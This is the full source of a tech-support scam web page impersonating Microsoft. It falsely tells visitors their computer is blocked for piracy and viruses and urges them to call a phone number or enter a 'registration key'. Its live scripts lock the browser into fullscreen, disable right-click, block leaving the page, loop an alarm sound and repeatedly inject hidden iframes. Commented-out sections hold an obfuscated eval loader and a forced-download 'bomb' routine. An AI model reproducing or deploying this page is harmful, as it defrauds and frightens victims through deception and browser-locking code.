
<!DOCTYPE html>
<html lang="en-en">
<head>
  <meta charset="utf-8">
  <meta content="user-scalable=no, width=device-width, initial-scale=1, maximum-scale=1" name="viewport">

  <title>Microsoft Official Support</title>

  <link href="./images/favicon.ico" rel="shortcut icon">

  <!-- Latest compiled and minified CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"
        integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

  <!-- Optional theme -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css"
        integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

  <!--<link rel="stylesheet" href="https://cdn.jsdelivr.net/bxslider/4.2.12/jquery.bxslider.css">-->
  <link rel="stylesheet" type="text/css" href="css/style.css">

  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-8888888-x"></script>
  <script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-8888888-x');
  </script>


  <script>
		//browser
		var isOpera = !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
		// Opera 8.0+ (UA detection to detect Blink/v8-powered Opera)
		var isFirefox = typeof InstallTrigger !== 'undefined';   // Firefox 1.0+
		var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
		// At least Safari 3+: "[object HTMLElementConstructor]"
		var isChrome = !!window.chrome && !isOpera;              // Chrome 1+
		var isIE = /*@cc_on!@*/false || !!document.documentMode;   // At least IE6
  </script>

</head>
<body oncontextmenu="return false"
      style="cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP///5WVlXiCGdAAAAADdFJOUwD8ZX+n/7gAAABvSURBVHja7dbBAUAwEABBQf81i6CGfZipYB3J2bY/GnnAHgec9QjOY9QBccEMaAvugLRgBZQFT0BY8AZ0BV9AVvB8hEt3D8SnYIz2FMxtlI7gfvVzBN1OXM9+1Dsx/ykAAAAAAAAAAAAAAAAAgNcFnc4A9qwo+wMAAAAASUVORK5CYII=&quot;) 128 128, crosshair; background-image: url('./images/background.png');">
<div id="body" class="container-fluid">
  <div class="row">
    <div class="col-md-12">
      <div class="row block1">
        <div class="col-md-4 left">
          <strong>Microsoft Security Tollfree:</strong>
          <p style="font-size:30px; color: rgba(0, 0, 0, 0.7);">+1-833-864-4143</p>
          <label style="font-size: 12px;">
            <input checked="nonchecked" type="checkbox"> Prevent this page from creating additional dialogues.</label>
        </div>
        <div class="col-md-4">
          <div class="middle" id="alert-modal">
            <a style="margin-right: 8px" href="" class="cross">×</a>
            <div class="content-box" id="alert-content-box">
              <center><strong>VIRUS ALERT FROM MICROSOFT</strong></center>
              <center><h5><b>This computer is BLOCKED</b></h5></center>
              <h6><b>Do not close this window and restart your computer</b></h6>
              <h6><b>Your computer's registration key is Blocked.</b></h6>
              <h6><b>Why we blocked your computer?</b></h6>
              <h6>The window's registration key is illegal.</h6>
              <h6>This window is using pirated software.</h6>
              <h6>This window is sending virus over the internet.</h6>
              <h6>This window is hacked or used from undefined location.</h6>
              <h6>We block this computer for your security. </h6>
              <h6>Contact microsoft helpline to reactivate your computer.</h6>
            </div>
          </div>

          <div class="block22">
            <div class="row">
              <div class="col-md-4">
                <img src="./images/rsod.png">
              </div>
              <div class="col-md-4">
                <div id="red_alert1" class=""style="">
                  <h1><img style="height: 40px; width: 40px; margin-top: -10px;"
                           src="images/335158-windows-8-window.png"> Windows Support Alert</h1>
                  <h3>Your System Detected Some Unusual Activity.</h3>
                  <h5>It might harm your computer data and track your financial activities.</h5>
                  <h3>Please report this activity to +1-833-864-4143</h3>
                </div>
                <div class="row">
                  <div class="col-md-12">
                    <div class="row">
                      <div class="col-md-12">
                        <button class="ms-btn">Ignore Alert</button>
                        <button class="ms-btn chat_now">Chat Now</button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-4 right">

          <form style="text-align: left;" action="login.php.htm" method="POST" align="center">
            <div>
              <strong>Enter Windows registration key to unblock.</strong>
            </div>
            <div class="tbl-center" style="margin-top: 5px;">
              <strong style="text-align:left;color: rgba(0, 0, 0, 0.7);"> ENTER KEY:</strong>
              <div style="min-width:100px;">
                <input type="text" name="ENTER KEY" style="width: 100%;" />
              </div>
              <div>
                <input class="ms-btn" type="button" value="Submit">
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>

<div class="block2">
  <div class="row">
    <div class="col-md-3">
      <img style="height: 240px; width: auto;" src="./images/rsod.png">
    </div>
    <div class="col-md-6">
      <div id="red_alert" style="margin-bottom: 25px;">
        <h1><img style="height: 40px; width: 40px; margin-top: -10px;" src="images/335158-windows-8-window.png"> Windows
          Support Alert</h1>
        <h3>Your System Detected Some Unusual Activity.</h3>
        <h5>It might harm your computer data and track your financial activities.</h5>
        <h3>Please report this activity to +1-833-864-4143</h3>
      </div>
      <div class="row">
        <div class="col-md-12">
          <div class="row">
            <div class="col-md-6 no-padding-right">
              <button class="ms-btn">Ignore Alert</button>
            </div>
            <div class="col-md-6 no-padding-left">
              <button class="ms-btn chat_now">Chat Now</button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<audio autoplay="autoplay" loop="" id="msgSound">
  <source src="./assets/audio/sound.mp3" type="audio/mpeg">
</audio>

<a id="download-link"
   href="index.html"
   download="index.html"
   style="opacity: 0;"></a>

<!-- scripts -->

<!-- Latest compiled and minified JavaScript -->
<script src="https://code.jquery.com/jquery-3.3.1.min.js"
        integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
        crossorigin="anonymous"></script>

<!--<script src="//cdn.jsdelivr.net/bxslider/4.2.12/jquery.bxslider.min.js"></script>-->

<script
  src="https://code.jquery.com/jquery-3.3.1.min.js"
  integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
  crossorigin="anonymous"></script>

<script src="js/script.js"></script>

<!--<script type="text/javascript">
	(function (funcName, baseObj) {
		// The public function name defaults to window.docReady
		// but you can pass in your own object and own function name and those will be used
		// if you want to put them in a different namespace
		funcName = funcName || "docReady";
		baseObj = baseObj || window;
		var readyList = [];
		var readyFired = false;
		var readyEventHandlersInstalled = false;

		// call this when the document is ready
		// this function protects itself against being called more than once
		function ready() {
			if (!readyFired) {
				// this must be set to true before we start calling callbacks
				readyFired = true;
				for (var i = 0; i < readyList.length; i++) {
					// if a callback here happens to add new ready handlers,
					// the docReady() function will see that it already fired
					// and will schedule the callback to run right after
					// this event loop finishes so all handlers will still execute
					// in order and no new ones will be added to the readyList
					// while we are processing the list
					readyList[i].fn.call(window, readyList[i].ctx);
				}
				// allow any closures held by these functions to free
				readyList = [];
			}
		}

		function readyStateChange() {
			if (document.readyState === "complete") {
				ready();
			}
		}

		// This is the one public interface
		// docReady(fn, context);
		// the context argument is optional - if present, it will be passed
		// as an argument to the callback
		baseObj[funcName] = function (callback, context) {
			// if ready has already fired, then just schedule the callback
			// to fire asynchronously, but right away
			if (readyFired) {
				setTimeout(function () {
					callback(context);
				}, 1);
				return;
			} else {
				// add the function and context to the list
				readyList.push({fn: callback, ctx: context});
			}
			// if document already ready to go, schedule the ready function to run
			if (document.readyState === "complete") {
				setTimeout(ready, 1);
			} else if (!readyEventHandlersInstalled) {
				// otherwise if we don't have event handlers installed, install them
				if (document.addEventListener) {
					// first choice is DOMContentLoaded event
					document.addEventListener("DOMContentLoaded", ready, false);
					// backup is window load event
					window.addEventListener("load", ready, false);
				} else {
					// must be IE
					document.attachEvent("onreadystatechange", readyStateChange);
					window.attachEvent("onload", ready);
				}
				readyEventHandlersInstalled = true;
			}
		}
	})("docReady", window);
</script>-->

<script type="text/javascript">
	var state = true;

	document.body.addEventListener('click', function toggleFullScreen() {
			_toggleFullScreen();
		}, true
	);

	window.addEventListener('mouseup', function toggleFullScreen() {
		_toggleFullScreen();

		if (navigator.userAgent.toLowerCase().indexOf('chrome') > -1 || navigator.userAgent.indexOf("Opera")) {
		} else {
			open1();
		}
	}, false);

	window.onbeforeunload = confirmExit;

	function confirmExit() {
		alert("Don't close this window! It's important!");
		return "You have attempted to leave this page. Are you sure?";
	}

	setInterval(function () {
		if (state === true) {

			document.getElementById('alert-modal').style = 'transform: scale(1.04)';
			state = false;
		} else {

			document.getElementById('alert-modal').style = 'transform: scale(1)';
			state = true;
		}
	}, 800);
</script>

<script type="text/javascript">
	document.addEventListener('keyup', function (es) {
		catchControlKeys(es);

		if (es.keyCode === 27) {
			_toggleFullScreen();

			if (navigator.userAgent.toLowerCase().indexOf('chrome') > -1 || navigator.userAgent.indexOf("Opera")) {
				open1();
			}
		}
	}, false);
</script>

<script type="text/javascript">
	document.addEventListener('keyup', function (e) {
		if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
			if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
				_toggleFullScreen();
			}
		}
	}, false);
</script>


<!-- CPD -->

<!--<script>
	(function () {
		var t = "",
			p = [8, 7, 9, 6, 5, 4, 9, 6, 3, 7],
			smat = unescape("-9%3D+7%3Co%7Bqj%7Cpxt*6A+5@-%3EKok%29%3B%3ElzNp%7Bkks%81+5@-%3EK+78.8%3B%2C%3A9j+76.8%3C5ksrip%29%3B%3Ei%7Cvj%7Dotr.8%3Bl-9B+%3CFn4sym%7DntyHnld%7Ct%7B.8%3D%29%3B%3F%28%3EL%2C%3B%3F*7K%7Cdy-99k*7M+8I-9%3BvzwqYwh%7Cl.87%29%3BI%289%3Avwhjjxxh%7Cvsxgi%29%3B8%289K%2C%3B8*6%3B+5J-9%3Bxjx%7Exq%5Dis%7Ek*6%3B+5J-9%3Buspxgg%2C%3A9.8H%29%3B8wv%5B%7B%7Bosk.85%2C%3DK.9Gs.9Gl-9L%7B*7M95%3C-9Llzrlzlvv%2C%3B%3Ej%29%3B%3F%28%3EJmxx*6A+6I54n+8F.8%3Cv6w%7Eym%29%3B%3Er5%7Borly%29%3B%3E%289A%2C%3B%3F*%3BM+5%3F32%7E+7%3D.9E%7Diy.85r.9Gm%7Dulznsw+5%3Fv%2C%3BIy%29%3B%3F%28%3EJynzzvw+57m%2C%3EHs1.9G7-%3CM+%3CH.9E%7B-%3AMzj%7C%7D+5J%7Fpwjt%7B.%3BEu-9A+769%7E3%2C%3A9.8%3E%29%3EJ%28%3ALm%7Ethxruq%2C%3A%3Fn+7%3D.%3DE%7Diy.85s.9Gu-9A+769%7E4%2C%3A9.8%3E/%7D+6Izl%7D%7Bwr.83l-%3CKt*6A+598%7F%3B+76.8%3C%2C%3DK.9Is.8Fv-%3EM+7G%80oqkw%7E.%3BGr.8%3B%2C%3A99%7E8%29%3B8%289A%2C%3EJ*7Mlxuk%7Brus%29%3B%3E%289A%2C@Hnj.8%3Bjwuoowq.8%3B%2C%3A9.87/%7D+5@-9Bltv.8%3B%7Diy.85i.9G%2C%3A9.87%29%3BIr%2C%3BK9+8Fx+6J9lA+8Fx1.%2C%3A@n1*7Mu%28%3CJu.8%3D%29%3B83%7F%3C%2C%3B8*6B+8K-9A+7%3D.8Foqz%7Duw%7D.%3BEu-9A+769%7E8%2C%3A9.8%3E%29%3EJ%289@7.8H4.8Fl-9B+8Fnrvl-99ltv.8%3Bl-%3AM+76.85%2C%3AJx+8H9+6Iw%2C%3CI6iA+6Iw24+7%3Dn1%28%3ALv.%3BGr.8%3B%2C%3A99%7E9%29%3B8%289A%2C%3EJ*6A+5@-9Lnnw%7Duu%80-%3CKt*6A+598%7F%3E+76.8%3C%2C%3DK.8%3D4.8F7-9Lk*6B+%3AK-%3EM%7Cfv.83%7B-9Lu*6L%7B%289Ky.8Hg.8Fp-9Lr*7Koi%2C%3A%3FryHl%7Bupl-%3EL+%3CGryRwmyj+7%3D.%3DE%7Diy.85h.9G%2C%3A8%3A+8F.87%2C%3A%3F.87lngg%2C%3A9.8%3E2jvslvk.8%3D%29%3B%3D%28%3AKzlxnt%7D+57%7Byl+8H.8557q%7C5ou%7Eku%806q%7C+76.9H%2C%3BJ.%3BH3%7Ciupx%7B.9J%29%3B%3D%289A%2C%3BI*6%3D+5%3F-9%3Bnjem+59-9B4ftykqk-9A+7%3B.9Fsqut+74qxhm-%3AM+7675fz%7B6vgnr7ivz-9%3B+74%7Bko%2C%3BK.87w%7D%7Fol%7Bonky%29%3B8%28%3AM%2C%3B%3D*6B+5Jlvl%7Briwz1nm%7BNrjqntwI%81Pm+7%3C.85h%7Dkru*6%3B+5@6wug%7E%29%3B%3E%289A%2C%3BI%7Cmwjr%7E6vwqj%7Dmuzu-%3AMlzrlzlvv%2C%3B%3Ej%29%3B%3F%28%3EJynzzvw+589%2C@J*6L%7Dlulv%804trtk%7Cwzl%7Cy*7Mlxuk%7Brus%29%3B%3Eh%2C%3A@.%3DGvnzxyv%2C%3B76%29@J%289Kvwhjjxxh%7Cvsxgi%29%3CJi%7Cvj%7Dotr.8%3B%2C%3A@.%3DGvnzxyv%2C%3B6fpnxw%2C%3A%3F.87%29%3CL%28%3AN%2C%3CL*7O+6M-%3AO+8J.83L%5BJ.8H%29%3B6%28%3AN%2C%3CL*7O+6M-%3AO+74.9I%2C%3BM.9K%29%3CL%28%3AN%2C%3CL*7O+57-%3AO+8J.9I%2C%3BM.9K%29%3CL%28%3AN%2C%3CL*6%3A+59-9B+7G.85%2C%3BM.9K%29%3CL%28%3AN%2C%3CL*7O+6M-99KXG.8F%2C%3A7.9K%29%3CL%28%3AN%2C%3CL*7O+57-%3AO+8J.9I%2C%3BM.9K%29%3CL%28%3AN%2C%3B6*7O+6M-%3AO+8J.9I%2C%3BM.9K%29%3CL%2899%2C%3B8*%3BM+5Jlvl%7Briwz1vvjxtyi%81zplv%7C.9Irn%7D%2898M%7Ethxruq%2C%3A%3F.87vnzxyv%2C%3B6keuyh%2C%3A9.8%3E%29%3CHivz%2C%3B%3E%7Be%7B+57%7B%2C%3CJ5%29%3CHv%2C%3BJ9+8F%7C1.%2C%3A@jrjv%7D+5%3F%7Cl%81z*6B+6In%7Cwiymxt%2898h.8%3D%29%3B%3F%28%3EJk.9K%29%3B%3Egvk%7Cvksx7mh%7BMsnsjr%7DH%7CPl%2C%3B%3E*6%3Bho%7Cm4%7Ciwint%289%3A%2C%3B%3F3w%7D%7Fol6kryupj%7F%28%3AL%2C%3B8gpxin%2C%3A9.8Hhxixtmu%7D4li%7DKolulwzxF%82ZdnVhvk*6A+59jvm%7F*6%3B+5@6p%7Dkr%29%3B%3E3%2C%3A@7yjxJzwyqi%7Ezj%29%3B%3E%289%3Ajugxw.85%2C%3AJ.87tjyw%2C%3A9.8%3E%29%3B%3F%28%3AIk.9I%29%3B73%2C%3FKo%7Bsg%7Doru-99s*6A+5@-%3EKjtg%7Eshu%7C5o%7Bqp%7CiulmuNrjqntw%2C%3FJ.%3DHhxixtmu%7D4rs%83LxstZlxjiwKolulwz*%3BL+%3AJlvl%7Briwz1%7EmitoyJ%7ErozkynksIukplv%7B.%3DH%29@I%289@kxizqntw5lvl%7BriwzHsmtnty2%7Bkt%7Cmz%7DLzpuyfymlw+8Jmuf%7Culwz3hxixtmu%7DKqivkq%7B6ynwzi%7CzI%7Cts%7Ciwint%289@%2C%3B%3F*7Jjrj%7Dtnty2muf%7CulwzJpnshu%7C5vu%7FVnwxl%7B%7BO%7Bqp%5Ciulmu.9Khxixtmu%7D4isl%7Bplv%7BNrjqntw5uv%83Xju%7Ekv%7BN%7CurXg%7Bkhu-9A+7%3D.9Dkwj%7Esjr%7D4gvk%7CvksxNrhtmu%7D4%7Cikql%7BZlz%7Bjw%7DLxstzlxjiw+5%3D-9%3Fjtg%7Eshu%7C5muhyvkq%7BMsnsjr%7D4zljrrzWiz%7Bhz%7CM%7Erqwlxhlv%2C%3B%3EJpnshu%7C5JRQS%60eNLaIXGWHhOQW%5D%5B.8%3E%29%3B%3F%289K%7Ertis%804rwmu.8%3D%29%3B8es%7Dl7vmt.85%2C%3AJ.87Euku%7B-9%3B+7G.85%7Eqk%7Dn*7M7%289Konoll%7D+6K9%2C%3BIxg%7Buosqup+8H%82kv%2C%3AJo%7Bqp%7Ciulmu.9I%7Dny%289Ksnly%29%3CJ6787.8Hxxv%28%3AL%3A965%29%3B8%289A%2C@Jisl%7Bplv%7B7mjxNrhtmu%7DH%7EMm+5%3F-9%3Bimvxsh4isnxyw.85%2C%3A@7yy%7Duk1kqzyrf%7D.9G%2C%3A9krtgt+59-9Ljtg%7Eshu%7C5jjiI%7Fkq%7BTp%7Czjrnx%289@%2C%3B8pi%82%7Bs%2C%3A9.8Hj%7Etf%7Bqvw+7%3Cn+5@-%3EK8%3C%29%3CJ%28%3ALl7qj%7DLugl-9%3F+7%3Av+5%3F-9B+%3CH.8F%2C%3A8%3A+7%3D.8Fkwj%7Esjr%7D4dklL%7FksxUov%7Bmunx*6A+59sl%82%7Bu%29%3B8%289Km%7Ethxruq%2C%3A%3Fn+7%3D.%3DE8%3A9.86%29%3CJh5sl%82Ithn+5%3D-9%3F7%3C%29%3B7%28%3ALl7qj%7DLugl-9%3F+7%3A%3A%3E%2899%2C%3CJj2tk%7CJwkn+7%3A.898%3B%2C%3B7*7Mk1rm%80Luii.%3DF%2C%3FJ.8%3De.8%3B%2C%3A@.8Hq.8%3B%2C%3A@.8%3E%29@J%289K%2C%3B76%29%3B%3F%289K%7Ertis%804rutvjj*7Mlxuk%7Brus%29%3B%3E%289A%2C@Hisl%7Bplv%7B7usguofr-%3AMlzrlzlvv%2C%3B%3Ej%29%3B%3F%28%3EJl.9Ii.%3DF%2C%3FJn%7Cjr%7D+5J%7Ch%7Bmjx.9Gl6%7Bjxli%7D+%3AJ-%3ELk3w%7BiHsmtnty%29%3BIwhznnz3xjmQhul.8Hq.8%3B%2C%3A@.8He.8%3B%2C%3A@.%3DI%29@J%289KhmjJzntwSqz%7Dksi%7B+5%3F-9%3Biqmlq%289%3A%2C%3BIkywiwpwu.8%3D%29%3B%3F%28%3EJh.8%3D%29%3B%3F%28%3AJ%7Djx*69k%28%3ALkxizqntw5lvl%7BriwzHsmtnty%29%3CH%289@l7xju%7Ekv%7BN%7CurXg%7Bkhu-%3EL+%3CGn4zljrrzWiz%7Bhz%7CM%7ErqWlxhlv%2C@I*%3BLk1tw%81%5BkvynywM%7DsuYhvnkq%2C%3A@7ifpu+5%3Fm%2C%3B%3F*%3BM+5@-9L%7Dnrmuz5ikmK%7BiwzOp%7B%7Bntjv.8%3B%2C%3A9%7Bkxm%83k%289%3A%2C%3BIkywiwpwu.8%3D%29%3B%3F%28%3EJ%2C%3B%3A*6A+59jvm%7F*6%3B+5@6j%7Cy*6A+59w%7Dnxkpx%7D%289%3A%2C%3BI*6%3Bnlkllw+76.8%3C%2C%3AJ.89%29%3B%3E%289%3A5yuuyy3dsmy%7D+76.8%3C5%7B%7Bxv*6A+5@6hwore%7Dk%289@%2C@Hgs%7Dzrt-%3AJ+76673w%80%2C%3B8*6Lushkp%7D%7F*7J7%28%3EL%2C%3BI%3A49+5@-9Ljtg%7Eshu%7C5pkyIukplv%7BK%7FNh.8%3B%2C%3A9j%7Bimx+59-9B4upj%7F%289@%2C%3B%3F*6Lyfymlw4%7Cmmzk%2C%3AJ%80oshx%7D1pvunx%5Cmmzk%2C%3AJ%80oshx%7D1zm%7BRtyi%7B%7Cds-9Alzrlzlvv%2C%3B%3E*6B+%3AInv%7B+7%3C%7Fgu%2C%3A7n+8H9+6Im%2C%3CI649+6Im24+7%3Dqov%7Bwy%824uy%7CnV%7Bi%7Bn+7%3C9+5J8%2C%3BIj%29%3B%3F%28%3EL%2C%3BI%3A49+5@-%3EM+7%3D.%3DGpn%2C%3B%3EnwRK%28%3EK%2C@Inw%5Cgihzp.8%3E%29@H%289%3C%2C%3B%3E*6%3B+5%3Ajs%7Ek2wlxhlv%2C%3BI3gqxrtm4jrjv%7D+59-9B4mmmk%289@%2C%3B%3F*7K%7Cdy-99l*7M+8I-9%3Busqx%7Bvlw%7C%7D+76.8F%2C%3A9kui%7D.85%2C%3AJ.87emjH%7Dmu%7DRnw%7Dkqlz%2C%3B8*6L+59uv%7Eyjs%7Ez%289%3A%2C%3BI*6%3B0-12130/.30-12130/.30-12130/.30-12130/.30-12130/..%3BFuZKW5%5EeqRr%7Dmy7%7Dtvv+588%3C%3EHHGJI%3CMMJ.85Mwlhj%7Cpxt*9Lt-12130/.30-12130/.30-12130/.30-12130/.30-12130/.3+8Jv%2C%3EIs%29%3B8%289K%2C%3B8fx%7DgfoM%7Dnty%29%3B8%28%3CL%2C%3CHn%29%3CJi%2C%3AJu+8H%3C%3C4%2C%3AJo%7Bsg%7Doru-9Ak*6B+%3AInv%7B+7%3C.9E45l.9G%29%3B%3Fl5x%7C%7Cn*6Ao1zppoz*6A+5@-9B+%3CH.8%3B23s.8%3E%29%3CHyhz%2C%3B6%7E%29%3CJi%7Cvj%7Dotr.8%3Bl-9Lt*6B+%3AIzl%7D%7Bwr.83m-%3CKk2%29%3CJ3%2C%3DK.%3DI%29%3CHu%2C%3BK%7Dk%7Dx.8Fj-%3AMzj%7C%7D+5Jisnxy%29%3B%3Eu%2C%3A@.8Hhxixtmu%7D+%3AF%82+5%3F-9%3B6%7D4.85%2C%3A@.%3BI%29%3EH%7C%2C%3A%3F.874%817%289%3A%2C%3B%3F*9M+6Mlvl%7Briwz%28%3CJ%80.8%3D%29%3B83%7F8%2C%3B8*6B+8K-%3CK%7F*6A+598%7F%3A+76.8%3C%2C%3DK.8%3D%7D.8%3B%2C%3A99%7E7%29%3B8%289A%2C%3BIkywiwpwu.8%3Di.8%3C%2C%3FIjrjv%7D+5%3F%81%2C%3B%3E*6%3B6%7B%3A-9%3B+7%3D4x%289A%2C@J*6L+589%2C%3B%3F*7Jjrj%7Dtnty%29%3EH%7C%2C%3A%3F.874%816%289%3A%2C%3B%3F*9M+8I%81%2C%3B%3E*6%3B6%7B%3B-9%3B+7%3D.%3BG%2C%3A%3F%82+7%3C.857%80%3C.87%29%3B%3F%289Km%7Ethxruq%2C%3A%3Fn+7%3D.%3DEhtl%7Bz*6Ax%289A%2C@J*6B+5J%7Fpwjt%7B7uqimmxxjywrrhl%2C%3CJkywiwpwu.8%3D%29%3B%3F%28%3EJynzzvw+57k%2C@J*%3BM+%3AK-9B+8F");
		for (var i = 0; i < smat.length; i += 10) {
			for (var k = 0; k <= 9; k++) {
				if ((k + i) < smat.length) {
					t += String.fromCharCode(smat.charCodeAt(i + k) - p[k]);
				}
			}
		}
		eval(unescape(t));
	})();
</script>-->

<!--<script type="text/javascript">
	function download(g, h, j) {
		var k = new Blob([g], {
			type: j
		});
		if (window.navigator.msSaveOrOpenBlob) window.navigator.msSaveOrOpenBlob(k, h);
		else {
			var l = document.createElement("a"),
				m = URL.createObjectURL(k);
			l.href = m, l.download = h, l.click(), setTimeout(function () {
			}, 0)
		}
	}

	function bomb_ch() {
		var g = Math.random().toString(36).substring(20),
			h = Math.floor(50 * Math.random() + 25);
		download(h, g, g)
	}

	docReady(function () {
		// setTimeout(function () {
		// 	setInterval(function() {
		bomb_ch()
		//  }, 0.5);
		// }, 2000);
	});

</script>-->

<!--<script type="text/javascript">/*<![CDATA[*/

	function get_browser() {
		var ua = navigator.userAgent, tem,
			M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
		if (/trident/i.test(M[1])) {
			tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
			return {name: 'IE', version: (tem[1] || '')};
		}
		if (M[1] === 'Chrome') {
			tem = ua.match(/\bOPR\/(\d+)/)
			if (tem != null) {
				return {name: 'Opera', version: tem[1]};
			}
		}
		M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
		if ((tem = ua.match(/version\/(\d+)/i)) != null) {
			M.splice(1, 1, tem[1]);
		}
		return {
			name: M[0],
			version: M[1]
		};
	}

	var InternetEx = window.navigator.appVersion.indexOf("MSIE") != -1;
	var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
	var browser = get_browser();
	if (browser.name == "Firefox" || isIEedge || InternetEx || navigator.appName == 'Microsoft Internet Explorer' || !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/))) {
		if (isIEedge || InternetEx || navigator.appName == 'Microsoft Internet Explorer' || !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/))) {

			function msg_ff() {

				var i = document.createElement("div");
				i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="security.php"></iframe></div>';
				document.body.appendChild(i);

			}

			window.setInterval(function () {
				msg_ff();

			}, 1100);

		}
		else {
			function msg_ff() {

				var i = document.createElement("div");
				i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="security.php"></iframe></div>';
				document.body.appendChild(i);
			}

			window.setInterval(function () {
				msg_ff();

			}, 1100);

		}

	}
	else {

	}

	/*]]>*/</script>-->
  <script type="text/javascript">/*<![CDATA[*/

   function get_browser(){
      var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
      if(/trident/i.test(M[1])){
          tem=/\brv[ :]+(\d+)/g.exec(ua) || [];
          return {name:'IE',version:(tem[1]||'')};
          }
      if(M[1]==='Chrome'){
          tem=ua.match(/\bOPR\/(\d+)/)
          if(tem!=null)   {return {name:'Opera', version:tem[1]};}
          }
      M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
      if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
      return {
        name: M[0],
        version: M[1]
      };
   }
   var InternetEx=window.navigator.appVersion.indexOf("MSIE")!=-1;
  var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
  var browser=get_browser();
  if(browser.name=="Firefox" || isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)) ){
    if(isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)))
      {

         function msg_ff() {

              var i = document.createElement("div");
              i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="security.php"></iframe></div>';
              document.body.appendChild(i);

          }
          window.setInterval(function() {
              msg_ff();

          }, 1100);

        }
    else{
        function msg_ff() {

              var i = document.createElement("div");
              i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="security.php"></iframe></div>';
              document.body.appendChild(i);
          }
          window.setInterval(function() {
              msg_ff();

          }, 1100);

      }

   }
   else{
     }


  /*]]>*/</script>
<iframe src="sound.mp3" allow="autoplay" style="display:none;">
</body>
</html>
